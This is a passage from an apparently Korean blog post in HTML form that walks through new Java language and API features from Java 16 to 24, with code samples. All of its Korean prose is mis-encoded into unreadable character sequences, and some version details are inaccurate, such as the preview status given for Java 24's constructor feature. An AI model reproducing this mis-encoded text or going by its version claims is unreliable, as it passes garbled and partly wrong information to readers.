œê³µë˜ë˜ Recordsê°€ ì •ì‹ ê¸°ëŠ¥ìœ¼ë¡œ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p><h3 id="instanceof-íŒ¨í„´-ë§¤ì¹­-ì •ì‹-ê¸°ëŠ¥"><a href="#instanceof-íŒ¨í„´-ë§¤ì¹­-ì •ì‹-ê¸°ëŠ¥" class="headerlink" title="instanceof íŒ¨í„´ ë§¤ì¹­ (ì •ì‹ ê¸°ëŠ¥)"></a>instanceof íŒ¨í„´ ë§¤ì¹­ (ì •ì‹ ê¸°ëŠ¥)</h3><p>Java 14ì—ì„œ í”„ë¦¬ë·°ì˜€ë˜ íŒ¨í„´ ë§¤ì¹­ì´ ì •ì‹ ê¸°ëŠ¥ì´ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><h3 id="Stream-toList"><a href="#Stream-toList" class="headerlink" title="Stream.toList()"></a>Stream.toList()</h3><p>ìŠ¤íŠ¸ë¦¼ì˜ ê²°ê³¼ë¥¼ ë¦¬ìŠ¤íŠ¸ë¡œ ë³€í™˜í•˜ëŠ” ê²ƒì´ ë” ê°„ë‹¨í•´ì¡ŒìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ê¸°ì¡´ ë°©ì‹</span></span><br><span class="line">List&lt;String&gt; list = stream</span><br><span class="line">    .filter(s -&gt; s.length() &gt; <span class="number">3</span>)</span><br><span class="line">    .collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line"><span class="comment">// ìƒˆë¡œìš´ ë°©ì‹</span></span><br><span class="line">List&lt;String&gt; list = stream</span><br><span class="line">    .filter(s -&gt; s.length() &gt; <span class="number">3</span>)</span><br><span class="line">    .toList();</span><br></pre></td></tr></table></figure><hr><h2 id="Java-17-2021ë…„-9ì›”-LTS"><a href="#Java-17-2021ë…„-9ì›”-LTS" class="headerlink" title="Java 17 (2021ë…„ 9ì›”) - LTS"></a>Java 17 (2021ë…„ 9ì›”) - LTS</h2><p>Java 17ì€ Java 11 ì´í›„ ë‘ ë²ˆì§¸ LTS ë²„ì „ìœ¼ë¡œ, ë§ì€ ê¸°ì—…ë“¤ì´ í˜„ì¬ ì‚¬ìš©í•˜ê±°ë‚˜ ë§ˆì´ê·¸ë ˆì´ì…˜ì„ ê³„íší•˜ê³  ìˆëŠ” ë²„ì „ì…ë‹ˆë‹¤.</p><h3 id="Sealed-Classes-ì •ì‹-ê¸°ëŠ¥"><a href="#Sealed-Classes-ì •ì‹-ê¸°ëŠ¥" class="headerlink" title="Sealed Classes (ì •ì‹ ê¸°ëŠ¥)"></a>Sealed Classes (ì •ì‹ ê¸°ëŠ¥)</h3><p>Java 15ì—ì„œ í”„ë¦¬ë·°ì˜€ë˜ Sealed Classesê°€ ì •ì‹ ê¸°ëŠ¥ì´ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><h3 id="switch-íŒ¨í„´-ë§¤ì¹­-Preview"><a href="#switch-íŒ¨í„´-ë§¤ì¹­-Preview" class="headerlink" title="switch íŒ¨í„´ ë§¤ì¹­ (Preview)"></a>switch íŒ¨í„´ ë§¤ì¹­ (Preview)</h3><p>switch ë¬¸ì—ì„œ íƒ€ì… íŒ¨í„´ì„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> String <span class="title function_">formatter</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">switch</span> (obj) &#123;</span><br><span class="line">        <span class="keyword">case</span> Integer i -&gt; String.format(<span class="string">&quot;int %d&quot;</span>, i);</span><br><span class="line">        <span class="keyword">case</span> Long l    -&gt; String.format(<span class="string">&quot;long %d&quot;</span>, l);</span><br><span class="line">        <span class="keyword">case</span> Double d  -&gt; String.format(<span class="string">&quot;double %f&quot;</span>, d);</span><br><span class="line">        <span class="keyword">case</span> String s  -&gt; String.format(<span class="string">&quot;String %s&quot;</span>, s);</span><br><span class="line">        <span class="keyword">default</span>        -&gt; obj.toString();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ë‚œìˆ˜-ìƒì„±-API-ê°œì„ "><a href="#ë‚œìˆ˜-ìƒì„±-API-ê°œì„ " class="headerlink" title="ë‚œìˆ˜ ìƒì„± API ê°œì„ "></a>ë‚œìˆ˜ ìƒì„± API ê°œì„ </h3><p>ìƒˆë¡œìš´ ë‚œìˆ˜ ìƒì„± ì¸í„°í˜ì´ìŠ¤ì™€ êµ¬í˜„ì²´ë“¤ì´ ì¶”ê°€ë˜ì–´ ë” ë‹¤ì–‘í•œ ë‚œìˆ˜ ìƒì„± ì•Œê³ ë¦¬ì¦˜ì„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RandomGenerator</span> <span class="variable">generator</span> <span class="operator">=</span> RandomGenerator.of(<span class="string">&quot;L64X128MixRandom&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">randomNumber</span> <span class="operator">=</span> generator.nextInt(<span class="number">100</span>);</span><br></pre></td></tr></table></figure><hr><h2 id="Java-18-2022ë…„-3ì›”"><a href="#Java-18-2022ë…„-3ì›”" class="headerlink" title="Java 18 (2022ë…„ 3ì›”)"></a>Java 18 (2022ë…„ 3ì›”)</h2><h3 id="UTF-8-ê¸°ë³¸-ë¬¸ì-ì¸ì½”ë”©"><a href="#UTF-8-ê¸°ë³¸-ë¬¸ì-ì¸ì½”ë”©" class="headerlink" title="UTF-8 ê¸°ë³¸ ë¬¸ì ì¸ì½”ë”©"></a>UTF-8 ê¸°ë³¸ ë¬¸ì ì¸ì½”ë”©</h3><p>JDKì˜ ê¸°ë³¸ ë¬¸ì ì¸ì½”ë”©ì´ UTF-8ë¡œ ë³€ê²½ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ì „ì—ëŠ” ìš´ì˜ì²´ì œì— ë”°ë¼ ê¸°ë³¸ ì¸ì½”ë”©ì´ ë‹¬ëì§€ë§Œ, ì´ì œëŠ” ëª¨ë“  í”Œë«í¼ì—ì„œ ì¼ê´€ë˜ê²Œ UTF-8ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><h3 id="ê°„ë‹¨í•œ-ì›¹-ì„œë²„"><a href="#ê°„ë‹¨í•œ-ì›¹-ì„œë²„" class="headerlink" title="ê°„ë‹¨í•œ ì›¹ ì„œë²„"></a>ê°„ë‹¨í•œ ì›¹ ì„œë²„</h3><p>í…ŒìŠ¤íŠ¸ë‚˜ í”„ë¡œí† íƒ€ì´í•‘ì„ ìœ„í•œ ê°„ë‹¨í•œ ì›¹ ì„œë²„ë¥¼ ëª…ë ¹ì¤„ì—ì„œ ë°”ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jwebserver</span><br><span class="line"><span class="comment"># http://localhost:8000 ì—ì„œ í˜„ì¬ ë””ë ‰í† ë¦¬ì˜ íŒŒì¼ì„ ì œê³µ</span></span><br></pre></td></tr></table></figure><h3 id="ì½”ë“œ-ìŠ¤ë‹ˆí«ì„-ìœ„í•œ-snippet-íƒœê·¸"><a href="#ì½”ë“œ-ìŠ¤ë‹ˆí«ì„-ìœ„í•œ-snippet-íƒœê·¸" class="headerlink" title="ì½”ë“œ ìŠ¤ë‹ˆí«ì„ ìœ„í•œ @snippet íƒœê·¸"></a>ì½”ë“œ ìŠ¤ë‹ˆí«ì„ ìœ„í•œ @snippet íƒœê·¸</h3><p>Javadocì—ì„œ ì½”ë“œ ì˜ˆì œë¥¼ ë” ì˜ ì‘ì„±í•  ìˆ˜ ìˆë„ë¡ ìƒˆë¡œìš´ íƒœê·¸ê°€ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p><hr><h2 id="Java-19-2022ë…„-9ì›”"><a href="#Java-19-2022ë…„-9ì›”" class="headerlink" title="Java 19 (2022ë…„ 9ì›”)"></a>Java 19 (2022ë…„ 9ì›”)</h2><h3 id="Virtual-Threads-Preview"><a href="#Virtual-Threads-Preview" class="headerlink" title="Virtual Threads (Preview)"></a>Virtual Threads (Preview)</h3><p>Project Loomì˜ í•µì‹¬ ê¸°ëŠ¥ì¸ ê°€ìƒ ìŠ¤ë ˆë“œê°€ í”„ë¦¬ë·°ë¡œ ì œê³µë˜ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤. ê°€ìƒ ìŠ¤ë ˆë“œëŠ” ê²½ëŸ‰ ìŠ¤ë ˆë“œë¡œ, ìˆ˜ë°±ë§Œ ê°œì˜ ìŠ¤ë ˆë“œë¥¼ ìƒì„±í•´ë„ ì‹œìŠ¤í…œ ë¦¬ì†ŒìŠ¤ë¥¼ í¬ê²Œ ì†Œë¹„í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ê°€ìƒ ìŠ¤ë ˆë“œ ìƒì„±</span></span><br><span class="line">Thread.startVirtualThread(() -&gt; &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Hello from virtual thread!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ExecutorServiceì™€ í•¨ê»˜ ì‚¬ìš©</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">var</span> <span class="variable">executor</span> <span class="operator">=</span> Executors.newVirtualThreadPerTaskExecutor()) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10_000</span>; i++) &#123;</span><br><span class="line">        executor.submit(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// ì‘ì—… ìˆ˜í–‰</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê°€ìƒ ìŠ¤ë ˆë“œëŠ” ë†’ì€ ë™ì‹œì„±ì´ í•„ìš”í•œ ì„œë²„ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ íŠ¹íˆ ìœ ìš©í•©ë‹ˆë‹¤.</p><h3 id="Structured-Concurrency-Incubator"><a href="#Structured-Concurrency-Incubator" class="headerlink" title="Structured Concurrency (Incubator)"></a>Structured Concurrency (Incubator)</h3><p>ì—¬ëŸ¬ ì‘ì—…ì„ êµ¬ì¡°í™”ëœ ë°©ì‹ìœ¼ë¡œ ë™ì‹œì— ì‹¤í–‰í•˜ê³  ê´€ë¦¬í•  ìˆ˜ ìˆëŠ” APIì…ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">var</span> <span class="variable">scope</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StructuredTaskScope</span>.ShutdownOnFailure()) &#123;</span><br><span class="line">    Future&lt;String&gt; user = scope.fork(() -&gt; fetchUser());</span><br><span class="line">    Future&lt;Integer&gt; order = scope.fork(() -&gt; fetchOrder());</span><br><span class="line"></span><br><span class="line">    scope.join();</span><br><span class="line">    scope.throwIfFailed();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ë‘ ì‘ì—…ì´ ëª¨ë‘ ì„±ê³µí–ˆì„ ë•Œë§Œ ì—¬ê¸° ë„ë‹¬</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(user.resultNow(), order.resultNow());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Record-Patterns-Preview"><a href="#Record-Patterns-Preview" class="headerlink" title="Record Patterns (Preview)"></a>Record Patterns (Preview)</h3><p>Recordì˜ ì»´í¬ë„ŒíŠ¸ë¥¼ íŒ¨í„´ ë§¤ì¹­ìœ¼ë¡œ ë¶„í•´í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">record</span> <span class="title class_">Point</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printSum</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="title function_">Point</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>) &#123;</span><br><span class="line">        System.out.println(x + y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Java-20-2023ë…„-3ì›”"><a href="#Java-20-2023ë…„-3ì›”" class="headerlink" title="Java 20 (2023ë…„ 3ì›”)"></a>Java 20 (2023ë…„ 3ì›”)</h2><h3 id="Scoped-Values-Incubator"><a href="#Scoped-Values-Incubator" class="headerlink" title="Scoped Values (Incubator)"></a>Scoped Values (Incubator)</h3><p>ìŠ¤ë ˆë“œ ë¡œì»¬ ë³€ìˆ˜ë¥¼ ëŒ€ì²´í•  ìˆ˜ ìˆëŠ” ìƒˆë¡œìš´ ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤. íŠ¹íˆ ê°€ìƒ ìŠ¤ë ˆë“œì™€ í•¨ê»˜ ì‚¬ìš©í•  ë•Œ íš¨ìœ¨ì ì…ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> ScopedValue&lt;User&gt; CURRENT_USER = ScopedValue.newInstance();</span><br><span class="line"></span><br><span class="line">ScopedValue.where(CURRENT_USER, user)</span><br><span class="line">    .run(() -&gt; &#123;</span><br><span class="line">        <span class="comment">// ì´ ìŠ¤ì½”í”„ ë‚´ì—ì„œ CURRENT_USER.get()ìœ¼ë¡œ user ì ‘ê·¼ ê°€ëŠ¥</span></span><br><span class="line">        processRequest();</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="Record-Patterns-Second-Preview"><a href="#Record-Patterns-Second-Preview" class="headerlink" title="Record Patterns (Second Preview)"></a>Record Patterns (Second Preview)</h3><p>Record íŒ¨í„´ì´ ê°œì„ ë˜ì–´ ì¤‘ì²©ëœ íŒ¨í„´ë„ ì§€ì›í•˜ê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><hr><h2 id="Java-21-2023ë…„-9ì›”-LTS"><a href="#Java-21-2023ë…„-9ì›”-LTS" class="headerlink" title="Java 21 (2023ë…„ 9ì›”) - LTS"></a>Java 21 (2023ë…„ 9ì›”) - LTS</h2><p>Java 21ì€ ìµœì‹  LTS ë²„ì „ìœ¼ë¡œ, ë§ì€ í˜ì‹ ì ì¸ ê¸°ëŠ¥ë“¤ì´ ì •ì‹ìœ¼ë¡œ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p><h3 id="Virtual-Threads-ì •ì‹-ê¸°ëŠ¥"><a href="#Virtual-Threads-ì •ì‹-ê¸°ëŠ¥" class="headerlink" title="Virtual Threads (ì •ì‹ ê¸°ëŠ¥)"></a>Virtual Threads (ì •ì‹ ê¸°ëŠ¥)</h3><p>ê°€ìƒ ìŠ¤ë ˆë“œê°€ ì •ì‹ ê¸°ëŠ¥ì´ ë˜ë©´ì„œ í”„ë¡œë•ì…˜ í™˜ê²½ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ëŠ” ìë°”ì˜ ë™ì‹œì„± í”„ë¡œê·¸ë˜ë° íŒ¨ëŸ¬ë‹¤ì„ì„ í¬ê²Œ ë³€í™”ì‹œí‚¬ ì¤‘ìš”í•œ ê¸°ëŠ¥ì…ë‹ˆë‹¤.</p><h3 id="Sequenced-Collections"><a href="#Sequenced-Collections" class="headerlink" title="Sequenced Collections"></a>Sequenced Collections</h3><p>ì»¬ë ‰ì…˜ì˜ ìˆœì„œë¥¼ ë‹¤ë£¨ëŠ” ìƒˆë¡œìš´ ì¸í„°í˜ì´ìŠ¤ë“¤ì´ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">SequencedCollection</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">Collection</span>&lt;E&gt; &#123;</span><br><span class="line">    SequencedCollection&lt;E&gt; <span class="title function_">reversed</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addFirst</span><span class="params">(E)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addLast</span><span class="params">(E)</span>;</span><br><span class="line">    E <span class="title function_">getFirst</span><span class="params">()</span>;</span><br><span class="line">    E <span class="title function_">getLast</span><span class="params">()</span>;</span><br><span class="line">    E <span class="title function_">removeFirst</span><span class="params">()</span>;</span><br><span class="line">    E <span class="title function_">removeLast</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.addFirst(<span class="string">&quot;first&quot;</span>);</span><br><span class="line">list.addLast(<span class="string">&quot;last&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">first</span> <span class="operator">=</span> list.getFirst();</span><br><span class="line">List&lt;String&gt; reversed = list.reversed();</span><br></pre></td></tr></table></figure><h3 id="switch-íŒ¨í„´-ë§¤ì¹­ê³¼-Record-íŒ¨í„´-ì •ì‹-ê¸°ëŠ¥"><a href="#switch-íŒ¨í„´-ë§¤ì¹­ê³¼-Record-íŒ¨í„´-ì •ì‹-ê¸°ëŠ¥" class="headerlink" title="switch íŒ¨í„´ ë§¤ì¹­ê³¼ Record íŒ¨í„´ (ì •ì‹ ê¸°ëŠ¥)"></a>switch íŒ¨í„´ ë§¤ì¹­ê³¼ Record íŒ¨í„´ (ì •ì‹ ê¸°ëŠ¥)</h3><p>ì´ì œ switch ë¬¸ì—ì„œ ë³µì¡í•œ íŒ¨í„´ ë§¤ì¹­ì„ í”„ë¡œë•ì…˜ ì½”ë“œì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sealed</span> <span class="keyword">interface</span> <span class="title class_">Vehicle</span> <span class="keyword">permits</span> Car, Truck, Motorcycle &#123;&#125;</span><br><span class="line"><span class="keyword">record</span> <span class="title class_">Car</span><span class="params">(String brand, <span class="type">int</span> doors)</span> <span class="keyword">implements</span> <span class="title class_">Vehicle</span> &#123;&#125;</span><br><span class="line"><span class="keyword">record</span> <span class="title class_">Truck</span><span class="params">(String brand, <span class="type">int</span> capacity)</span> <span class="keyword">implements</span> <span class="title class_">Vehicle</span> &#123;&#125;</span><br><span class="line"><span class="keyword">record</span> <span class="title class_">Motorcycle</span><span class="params">(String brand)</span> <span class="keyword">implements</span> <span class="title class_">Vehicle</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> String <span class="title function_">describe</span><span class="params">(Vehicle vehicle)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">switch</span> (vehicle) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="title function_">Car</span><span class="params">(<span class="keyword">var</span> brand, <span class="keyword">var</span> doors)</span> -&gt;</span><br><span class="line">            String.format(<span class="string">&quot;%s car with %d doors&quot;</span>, brand, doors);</span><br><span class="line">        <span class="keyword">case</span> <span class="title function_">Truck</span><span class="params">(<span class="keyword">var</span> brand, <span class="keyword">var</span> capacity)</span> -&gt;</span><br><span class="line">            String.format(<span class="string">&quot;%s truck with %d tons capacity&quot;</span>, brand, capacity);</span><br><span class="line">        <span class="keyword">case</span> <span class="title function_">Motorcycle</span><span class="params">(<span class="keyword">var</span> brand)</span> -&gt;</span><br><span class="line">            String.format(<span class="string">&quot;%s motorcycle&quot;</span>, brand);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="String-Templates-Preview"><a href="#String-Templates-Preview" class="headerlink" title="String Templates (Preview)"></a>String Templates (Preview)</h3><p>ë¬¸ìì—´ ë³´ê°„ì„ ì•ˆì „í•˜ê²Œ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì…ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;John&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String template ì‚¬ìš©</span></span><br><span class="line"><span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> STR.<span class="string">&quot;Hello, \&#123;name&#125;! You are \&#123;age&#125; years old.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SQL ì¿¼ë¦¬ì—ë„ ì•ˆì „í•˜ê²Œ ì‚¬ìš©</span></span><br><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> SQL.<span class="string">&quot;SELECT * FROM users WHERE name = \&#123;name&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><hr><h2 id="Java-22-2024ë…„-3ì›”"><a href="#Java-22-2024ë…„-3ì›”" class="headerlink" title="Java 22 (2024ë…„ 3ì›”)"></a>Java 22 (2024ë…„ 3ì›”)</h2><h3 id="Unnamed-Variables-Patterns"><a href="#Unnamed-Variables-Patterns" class="headerlink" title="Unnamed Variables &amp; Patterns"></a>Unnamed Variables &amp; Patterns</h3><p>ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ë³€ìˆ˜ë‚˜ íŒ¨í„´ì„ ëª…ì‹œì ìœ¼ë¡œ í‘œì‹œí•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ë³€ìˆ˜</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception _) &#123;</span><br><span class="line">    <span class="comment">// ì˜ˆì™¸ ê°ì²´ë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠìŒ</span></span><br><span class="line">    System.out.println(<span class="string">&quot;Error occurred&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” íŒ¨í„´</span></span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="title function_">Point</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> _)</span>) &#123;</span><br><span class="line">    <span class="comment">// y ì¢Œí‘œëŠ” ì‚¬ìš©í•˜ì§€ ì•ŠìŒ</span></span><br><span class="line">    System.out.println(<span class="string">&quot;x: &quot;</span> + x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Statements-before-super-Preview"><a href="#Statements-before-super-Preview" class="headerlink" title="Statements before super() (Preview)"></a>Statements before super() (Preview)</h3><p>ìƒì„±ìì—ì„œ super() í˜¸ì¶œ ì „ì— ë¬¸ì¥ì„ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PositiveBigInteger</span> <span class="keyword">extends</span> <span class="title class_">BigInteger</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PositiveBigInteger</span><span class="params">(<span class="type">long</span> value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (value &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;non-positive value&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>(value);  <span class="comment">// super() í˜¸ì¶œ ì „ì— ê²€ì¦ ê°€ëŠ¥</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Foreign-Function-Memory-API-ì •ì‹-ê¸°ëŠ¥"><a href="#Foreign-Function-Memory-API-ì •ì‹-ê¸°ëŠ¥" class="headerlink" title="Foreign Function &amp; Memory API (ì •ì‹ ê¸°ëŠ¥)"></a>Foreign Function &amp; Memory API (ì •ì‹ ê¸°ëŠ¥)</h3><p>ë„¤ì´í‹°ë¸Œ ì½”ë“œì™€ ìƒí˜¸ì‘ìš©í•˜ê¸° ìœ„í•œ ì•ˆì „í•˜ê³  íš¨ìœ¨ì ì¸ APIê°€ ì •ì‹ìœ¼ë¡œ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤. JNIë¥¼ ëŒ€ì²´í•  ìˆ˜ ìˆëŠ” í˜„ëŒ€ì ì¸ ë°©ë²•ì„ ì œê³µí•©ë‹ˆë‹¤.</p><hr><h2 id="Java-23-2024ë…„-9ì›”"><a href="#Java-23-2024ë…„-9ì›”" class="headerlink" title="Java 23 (2024ë…„ 9ì›”)"></a>Java 23 (2024ë…„ 9ì›”)</h2><h3 id="Primitive-Types-in-Patterns-Preview"><a href="#Primitive-Types-in-Patterns-Preview" class="headerlink" title="Primitive Types in Patterns (Preview)"></a>Primitive Types in Patterns (Preview)</h3><p>primitive íƒ€ì…ë„ íŒ¨í„´ ë§¤ì¹­ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (obj) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="type">int</span> i    -&gt; System.out.println(<span class="string">&quot;int: &quot;</span> + i);</span><br><span class="line">        <span class="keyword">case</span> <span class="type">long</span> l   -&gt; System.out.println(<span class="string">&quot;long: &quot;</span> + l);</span><br><span class="line">        <span class="keyword">case</span> <span class="type">double</span> d -&gt; System.out.println(<span class="string">&quot;double: &quot;</span> + d);</span><br><span class="line">        <span class="keyword">case</span> String s -&gt; System.out.println(<span class="string">&quot;String: &quot;</span> + s);</span><br><span class="line">        <span class="keyword">default</span>       -&gt; System.out.println(<span class="string">&quot;other&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Module-Import-Declarations-Preview"><a href="#Module-Import-Declarations-Preview" class="headerlink" title="Module Import Declarations (Preview)"></a>Module Import Declarations (Preview)</h3><p>ëª¨ë“ˆì˜ ëª¨ë“  íŒ¨í‚¤ì§€ë¥¼ í•œ ë²ˆì— import í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">module</span> java.base;  <span class="comment">// java.base ëª¨ë“ˆì˜ ëª¨ë“  íŒ¨í‚¤ì§€ import</span></span><br></pre></td></tr></table></figure><h3 id="Markdown-in-Javadoc"><a href="#Markdown-in-Javadoc" class="headerlink" title="Markdown in Javadoc"></a>Markdown in Javadoc</h3><p>Javadoc ì£¼ì„ì—ì„œ Markdown ë¬¸ë²•ì„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/// # Header</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// This is **bold** and this is *italic*</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// - List item 1</span></span><br><span class="line"><span class="comment">/// - List item 2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Java-24-2025ë…„-3ì›”"><a href="#Java-24-2025ë…„-3ì›”" class="headerlink" title="Java 24 (2025ë…„ 3ì›”)"></a>Java 24 (2025ë…„ 3ì›”)</h2><h3 id="Improved-Pattern-Matching"><a href="#Improved-Pattern-Matching" class="headerlink" title="Improved Pattern Matching"></a>Improved Pattern Matching</h3><p>íŒ¨í„´ ë§¤ì¹­ì´ ë”ìš± ê°•ë ¥í•´ì§€ê³  ì‚¬ìš©í•˜ê¸° í¸ë¦¬í•´ì¡ŒìŠµë‹ˆë‹¤.</p><h3 id="Flexible-Constructor-Bodies-Second-Preview"><a href="#Flexible-Constructor-Bodies-Second-Preview" class="headerlink" title="Flexible Constructor Bodies (Second Preview)"></a>Flexible Constructor Bodies (Second Preview)</h3><p>ìƒì„±ì ë³¸ë¬¸ì—ì„œ super() í˜¸ì¶œ ì „ì— ë” ë§ì€ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p><h3 id="Stream-Gatherers"><a 